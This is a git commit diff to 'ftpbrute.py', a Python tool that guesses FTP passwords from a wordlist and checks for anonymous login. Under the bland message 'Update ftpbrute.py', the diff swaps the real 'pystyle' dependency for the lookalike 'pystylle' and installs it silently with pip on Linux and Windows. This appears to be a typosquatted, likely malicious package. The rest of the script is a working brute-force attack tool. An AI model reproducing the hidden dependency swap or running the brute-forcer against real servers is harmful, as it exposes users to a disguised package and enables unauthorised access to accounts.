7434261f0381953717713fe9accc4a3dd9d5aae5
clay <82051128+machine1337@users.noreply.github.com>
2022-11-29 03:28:29 -0800

    Update ftpbrute.py

--- ftpbrute.py
+++ ftpbrute.py
@@ -2,6 +2,7 @@ import sys
 from ftplib import FTP
 import os
 import platform
+
 print("[*] Checking Requirements Module.....")
 if platform.system().startswith("Linux"):
     try:
@@ -10,10 +11,10 @@ if platform.system().startswith("Linux"):
         os.system("python3 -m pip install termcolor -q -q -q")
         import termcolor
     try:
-        from pystyle import *
+        from pystylle import *
     except:
-        os.system("python3 -m pip install pystyle -q -q -q")
-        from Pystyiles import *
+        os.system("python3 -m pip install pystylle -q -q -q")
+        from pystylle import *
     try:
         import colorama
     except ImportError:
@@ -27,14 +28,14 @@ elif platform.system().startswith("Windows"):
         os.system("python -m pip install termcolor -q -q -q")
         import termcolor
     try:
-        from pystyle import *
+        from pystylle import *
     except:
-        os.system("python -m pip install pystyle -q -q -q")
-        from pystyle import *
+        os.system("python -m pip install pystylle -q -q -q")
+        from pystylle import *
     try:
         import colorama
     except ImportError:
-        os.system("python -m pip install colorama")
+        os.system("python -m pip install colorama -q -q -q")
         import colorama
 colorama.deinit()
 banner = Center.XCenter("""
@@ -46,28 +47,34 @@ banner = Center.XCenter("""
         \_\                                                          /_/
                             \n\n
 """)
+
+
 def check_anonymous_login(target):
     try:
         ftp = FTP(target)
         ftp.login()
         print("\n[+] Anonymous login is open.")
-        print ("\n[+] Username : anonymous")
-        print( "\n[+] Password : anonymous\n")
+        print("\n[+] Username : anonymous")
+        print("\n[+] Password : anonymous\n")
         ftp.quit()
     except:
         pass
+
+
 def ftp_login(target, username, password):
-    print(termcolor.colored(f"Username: {username}  | Password: {password}",'blue'))
+    print(termcolor.colored(f"Username: {username}  | Password: {password}", 'blue'))
     try:
         ftp = FTP(target)
         ftp.login(username, password)
         ftp.quit()
-        print(termcolor.colored("\n[✔] Credentials have found.",'green'))
-        print(termcolor.colored("\n[✔] Username : {}".format(username),'cyan'))
-        print (termcolor.colored("\n[✔] Password : {}".format(password),'yellow'))
+        print(termcolor.colored("\n[✔] Credentials have found.", 'green'))
+        print(termcolor.colored("\n[✔] Username : {}".format(username), 'cyan'))
+        print(termcolor.colored("\n[✔] Password : {}".format(password), 'yellow'))
         sys.exit(0)
     except:
         pass
+
+
 def brute_force(target, username, wordlist):
     try:
         wordlist = open(wordlist, "r")
@@ -77,8 +84,10 @@ def brute_force(target, username, wordlist):
             ftp_login(target, username, word)
 
     except:
-        print(termcolor.colored("[X] No password List Found!",'red'))
+        print(termcolor.colored("[X] No password List Found!", 'red'))
         sys.exit(0)
+
+
 os.system('cls' if os.name == 'nt' else 'clear')
 print(Colorate.Vertical(Colors.green_to_yellow, banner, 2))
 try:
@@ -86,11 +95,11 @@ try:
     username = input(termcolor.colored("\n[*] Enter Username:- ", 'green'))
     wordlist = input(termcolor.colored("\n[*] Enter Path Of Password List:- ", 'green'))
     print('\n')
-    
+
 except KeyboardInterrupt:
     print(termcolor.colored("[X] You Pressed The Exit Button!", 'red'))
     quit()
 
 brute_force(target, username, wordlist)
 check_anonymous_login(target)
-print(termcolor.colored("[*] Completed...\n",'blue'));
+print(termcolor.colored("[*] Completed...\n", 'blue'));
